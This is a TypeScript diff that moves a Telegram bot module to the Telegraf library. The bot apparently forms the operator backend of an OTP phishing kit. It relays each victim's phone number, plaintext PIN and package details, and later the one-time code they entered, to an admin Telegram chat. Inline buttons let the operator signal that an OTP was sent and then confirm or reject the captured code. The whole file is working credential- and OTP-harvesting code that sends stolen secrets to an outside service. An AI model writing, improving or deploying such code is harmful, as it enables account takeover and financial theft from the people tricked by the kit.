@@ -1,190 +1,190 @@
+import { Telegraf, Markup } from "telegraf";
 import { logger } from "./logger";
 import { db, sessionsTable } from "@workspace/db";
 import { eq } from "drizzle-orm";
 
-const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const BASE = `https://api.telegram.org/bot${TOKEN}`;
-
-async function apiCall(method: string, body: Record<string, unknown>): Promise<Record<string, unknown>> {
-  const res = await fetch(`${BASE}/${method}`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(body),
-  });
-  const data = await res.json() as Record<string, unknown>;
-  if (!data["ok"]) {
-    logger.warn({ method, response: data }, "Telegram API call failed");
-  }
-  return data;
-}
-
-export async function sendMessage(text: string, replyMarkup?: unknown): Promise<void> {
-  if (!TOKEN || !CHAT_ID) return;
-  const body: Record<string, unknown> = {
-    chat_id: CHAT_ID,
-    text,
-    parse_mode: "Markdown",
-  };
-  if (replyMarkup) body["reply_markup"] = replyMarkup;
-  await apiCall("sendMessage", body);
-}
-
-async function answerCallbackQuery(callbackQueryId: string, text: string): Promise<void> {
-  await apiCall("answerCallbackQuery", { callback_query_id: callbackQueryId, text });
-}
-
-async function editMessageText(messageId: number, text: string, replyMarkup?: unknown): Promise<void> {
-  if (!TOKEN || !CHAT_ID) return;
-  const body: Record<string, unknown> = {
-    chat_id: CHAT_ID,
-    message_id: messageId,
-    text,
-    parse_mode: "Markdown",
-  };
-  if (replyMarkup) body["reply_markup"] = replyMarkup;
-  await apiCall("editMessageText", body);
-}
-
-/** Inline keyboard shown after user logs in — admin confirms they've sent OTP */
-export function buildLoginKeyboard(sessionId: string): unknown {
-  return {
-    inline_keyboard: [[
-      { text: "📤 OTP Envoyé", callback_data: `otp_sent:${sessionId}` },
-    ]],
-  };
-}
-
-/** Inline keyboard shown after user submits OTP — admin confirms or rejects */
-export function buildOtpKeyboard(sessionId: string): unknown {
-  return {
-    inline_keyboard: [[
-      { text: "✅ Confirmer", callback_data: `confirm:${sessionId}` },
-      { text: "❌ Rejeter", callback_data: `reject:${sessionId}` },
-    ]],
-  };
-}
+const TOKEN = process.env.TELEGRAM_BOT_TOKEN ?? "";
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID ?? "";
 
 // ---------------------------------------------------------------------------
-// Long-polling loop
+// Singleton bot instance — action handlers are registered at module load time
 // ---------------------------------------------------------------------------
+const bot = new Telegraf(TOKEN);
 
-let offset = 0;
-let active = false;
-
-interface TelegramUpdate {
-  update_id: number;
-  callback_query?: {
-    id: string;
-    data?: string;
-    message?: { message_id: number };
-  };
-}
-
-async function poll(): Promise<void> {
-  if (!active) return;
+// ── Admin clicks "📤 OTP Envoyé" ─────────────────────────────────────────
+bot.action(/^otp_sent:(.+)$/, async (ctx) => {
+  const sessionId = ctx.match[1]!;
+  logger.info({ sessionId }, "Admin clicked: OTP Envoyé");
 
   try {
-    const res = await fetch(
-      `${BASE}/getUpdates?offset=${offset}&timeout=25&allowed_updates=["callback_query"]`,
-      { signal: AbortSignal.timeout(30_000) },
-    );
-    const payload = await res.json() as { ok: boolean; result?: TelegramUpdate[] };
+    const [session] = await db
+      .select()
+      .from(sessionsTable)
+      .where(eq(sessionsTable.id, sessionId));
 
-    if (payload.ok && payload.result) {
-      for (const update of payload.result) {
-        offset = update.update_id + 1;
-        await handleUpdate(update);
-      }
+    if (!session) {
+      await ctx.answerCbQuery("Session introuvable ❌");
+      return;
     }
-  } catch (err) {
-    logger.error({ err }, "Telegram polling error");
-    await new Promise((r) => setTimeout(r, 3000));
-  }
 
-  if (active) setTimeout(poll, 200);
-}
-
-async function handleUpdate(update: TelegramUpdate): Promise<void> {
-  if (!update.callback_query) return;
-
-  const { id: cbId, data: cbData, message } = update.callback_query;
-  if (!cbData) return;
-
-  const colonIdx = cbData.indexOf(":");
-  if (colonIdx === -1) return;
-
-  const action = cbData.slice(0, colonIdx);
-  const sessionId = cbData.slice(colonIdx + 1);
-
-  const rows = await db
-    .select()
-    .from(sessionsTable)
-    .where(eq(sessionsTable.id, sessionId));
-
-  const session = rows[0];
-  if (!session) {
-    await answerCallbackQuery(cbId, "Session introuvable");
-    return;
-  }
-
-  if (action === "otp_sent") {
-    // Admin has manually sent OTP to user — unlock the OTP entry page
     await db
       .update(sessionsTable)
       .set({ status: "otp_sent" })
       .where(eq(sessionsTable.id, sessionId));
 
-    await answerCallbackQuery(cbId, "📤 OTP marqué comme envoyé — l'utilisateur peut maintenant saisir le code");
+    await ctx.answerCbQuery("📤 OTP envoyé — utilisateur débloqué");
 
-    if (message?.message_id) {
-      await editMessageText(
-        message.message_id,
-        `📤 *OTP ENVOYÉ*\n\n📱 Téléphone: \`${session.phone}\`\n🔑 PIN: \`${session.pin}\`\n📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n\n_En attente de saisie OTP par l'utilisateur..._`,
-      );
+    await ctx.editMessageText(
+      `📤 *OTP ENVOYÉ*\n\n` +
+      `📱 Téléphone: \`${session.phone}\`\n` +
+      `🔑 PIN: \`${session.pin}\`\n` +
+      `📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n\n` +
+      `_En attente de la saisie OTP par l'utilisateur..._`,
+      { parse_mode: "Markdown" },
+    );
+
+    logger.info({ sessionId }, "Session → otp_sent");
+  } catch (err) {
+    logger.error({ err, sessionId }, "Error in otp_sent handler");
+    await ctx.answerCbQuery("Erreur interne").catch(() => {});
+  }
+});
+
+// ── Admin clicks "✅ Confirmer" ───────────────────────────────────────────
+bot.action(/^confirm:(.+)$/, async (ctx) => {
+  const sessionId = ctx.match[1]!;
+  logger.info({ sessionId }, "Admin clicked: Confirmer");
+
+  try {
+    const [session] = await db
+      .select()
+      .from(sessionsTable)
+      .where(eq(sessionsTable.id, sessionId));
+
+    if (!session) {
+      await ctx.answerCbQuery("Session introuvable ❌");
+      return;
     }
-    logger.info({ sessionId }, "Admin marked OTP as sent");
 
-  } else if (action === "confirm") {
     await db
       .update(sessionsTable)
       .set({ status: "verified" })
       .where(eq(sessionsTable.id, sessionId));
 
-    await answerCallbackQuery(cbId, "✅ OTP confirmé — utilisateur connecté");
+    await ctx.answerCbQuery("✅ OTP confirmé — utilisateur connecté !");
 
-    if (message?.message_id) {
-      await editMessageText(
-        message.message_id,
-        `✅ *OTP CONFIRMÉ*\n\n📱 Téléphone: \`${session.phone}\`\n📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n🔢 OTP: \`${session.enteredOtp ?? "?"}\`\n\n_Utilisateur connecté avec succès._`,
-      );
+    await ctx.editMessageText(
+      `✅ *OTP CONFIRMÉ*\n\n` +
+      `📱 Téléphone: \`${session.phone}\`\n` +
+      `📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n` +
+      `🔢 OTP: \`${session.enteredOtp ?? "?"}\`\n\n` +
+      `_Utilisateur connecté avec succès._`,
+      { parse_mode: "Markdown" },
+    );
+
+    logger.info({ sessionId }, "Session → verified");
+  } catch (err) {
+    logger.error({ err, sessionId }, "Error in confirm handler");
+    await ctx.answerCbQuery("Erreur interne").catch(() => {});
+  }
+});
+
+// ── Admin clicks "❌ Rejeter" ─────────────────────────────────────────────
+bot.action(/^reject:(.+)$/, async (ctx) => {
+  const sessionId = ctx.match[1]!;
+  logger.info({ sessionId }, "Admin clicked: Rejeter");
+
+  try {
+    const [session] = await db
+      .select()
+      .from(sessionsTable)
+      .where(eq(sessionsTable.id, sessionId));
+
+    if (!session) {
+      await ctx.answerCbQuery("Session introuvable ❌");
+      return;
     }
-    logger.info({ sessionId }, "Session verified by admin");
 
-  } else if (action === "reject") {
     await db
       .update(sessionsTable)
       .set({ status: "rejected" })
       .where(eq(sessionsTable.id, sessionId));
 
-    await answerCallbackQuery(cbId, "❌ OTP rejeté");
+    await ctx.answerCbQuery("❌ OTP rejeté");
 
-    if (message?.message_id) {
-      await editMessageText(
-        message.message_id,
-        `❌ *OTP REJETÉ*\n\n📱 Téléphone: \`${session.phone}\`\n📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n🔢 OTP: \`${session.enteredOtp ?? "?"}\``,
-      );
-    }
-    logger.info({ sessionId }, "Session rejected by admin");
+    await ctx.editMessageText(
+      `❌ *OTP REJETÉ*\n\n` +
+      `📱 Téléphone: \`${session.phone}\`\n` +
+      `📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n` +
+      `🔢 OTP: \`${session.enteredOtp ?? "?"}\``,
+      { parse_mode: "Markdown" },
+    );
+
+    logger.info({ sessionId }, "Session → rejected");
+  } catch (err) {
+    logger.error({ err, sessionId }, "Error in reject handler");
+    await ctx.answerCbQuery("Erreur interne").catch(() => {});
+  }
+});
+
+// ---------------------------------------------------------------------------
+// Keyboard builders
+// ---------------------------------------------------------------------------
+
+export function buildLoginKeyboard(sessionId: string) {
+  return Markup.inlineKeyboard([
+    [Markup.button.callback("📤 OTP Envoyé", `otp_sent:${sessionId}`)],
+  ]);
+}
+
+export function buildOtpKeyboard(sessionId: string) {
+  return Markup.inlineKeyboard([
+    [
+      Markup.button.callback("✅ Confirmer", `confirm:${sessionId}`),
+      Markup.button.callback("❌ Rejeter", `reject:${sessionId}`),
+    ],
+  ]);
+}
+
+// ---------------------------------------------------------------------------
+// Send a message to the configured admin chat
+// ---------------------------------------------------------------------------
+
+export async function sendMessage(
+  text: string,
+  extra?: object,
+): Promise<void> {
+  if (!TOKEN || !CHAT_ID) return;
+  try {
+    await bot.telegram.sendMessage(CHAT_ID, text, {
+      parse_mode: "Markdown",
+      ...(extra ?? {}),
+    } as Parameters<typeof bot.telegram.sendMessage>[2]);
+  } catch (err) {
+    logger.error({ err }, "sendMessage failed");
   }
 }
 
+// ---------------------------------------------------------------------------
+// Start long-polling (only called in non-dev environments)
+// ---------------------------------------------------------------------------
+
 export function startPolling(): void {
   if (!TOKEN || !CHAT_ID) {
-    logger.warn("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing — notifications disabled");
+    logger.warn("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing — bot disabled");
     return;
   }
-  active = true;
-  logger.info("Telegram bot polling started");
-  poll();
+
+  logger.info("Telegraf bot launching...");
+
+  // bot.launch() deletes any stale webhook then starts long-polling.
+  // It returns a Promise that resolves when the bot stops — do NOT await it.
+  bot
+    .launch({ allowedUpdates: ["callback_query"] })
+    .catch((err: unknown) => logger.error({ err }, "Telegraf bot error"));
+
+  process.once("SIGINT", () => bot.stop("SIGINT"));
+  process.once("SIGTERM", () => bot.stop("SIGTERM"));
+
+  logger.info("Telegraf bot polling started ✓");
 }
